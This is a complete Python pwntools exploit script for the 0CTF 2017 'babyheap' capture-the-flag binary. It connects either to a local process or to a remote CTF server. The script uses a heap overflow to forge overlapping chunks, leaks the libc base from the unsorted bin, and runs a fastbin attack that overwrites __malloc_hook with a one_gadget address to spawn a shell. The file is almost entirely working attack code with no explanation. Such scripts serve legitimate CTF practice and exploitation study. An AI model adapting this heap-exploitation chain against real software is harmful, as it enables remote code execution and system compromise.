import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./babyheap_0ctf_2017')
	elf=ELF('./babyheap_0ctf_2017')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else :
	io=remote('buuoj.cn',20001)
	elf=ELF('./babyheap_0ctf_2017')
	libc=ELF('./libc_64')

def add(a):
	io.sendlineafter('Command: ','1')
	io.sendlineafter('Size: ',str(a))

def edit(a,b,c):
	io.sendlineafter('Command: ','2')
	io.sendlineafter('Index: ',str(a))
	io.sendlineafter('Size: ',str(b))
	io.sendafter('Content: ',c)

def delete(a):
	io.sendlineafter('Command: ','3')
	io.sendlineafter('Index: ',str(a))

def show(a):
	io.sendlineafter('Command: ','4')
	io.sendlineafter('Index: ',str(a))

add(0x60)    #0
add(0x40)#1
add(0x100)#2
add(0x20)#3

add(0x60)#4
add(0x60)#5
add(0x60)#6
add(0x20)#7
edit(0,0x70,'a'*0x60+p64(0)+p64(0x71))
edit(2,0x20,'a'*0x10+p64(0)+p64(0x61))
delete(1)
add(0x60)#8
edit(1,0x50,'\x00'*0x40+p64(0)+p64(0x111))
delete(2)
show(1)
libc_base=u64(io.recvuntil('1.')[0x5a:0x60]+'\x00\x00')-88-0x3c4b20
success('libc_base:'+hex(libc_base))
delete(4)
edit(3,0x40,'a'*0x20+p64(0)+p64(0x71)+p64(libc_base+0x3c4b10-0x23)+p64(0))
add(0x60)  #9
add(0x60)  #10
edit(4,0x13+8,'a'*0x13+p64(libc_base+0x4526a))
add(1)
#gdb.attach(io)
#pause()
io.interactive()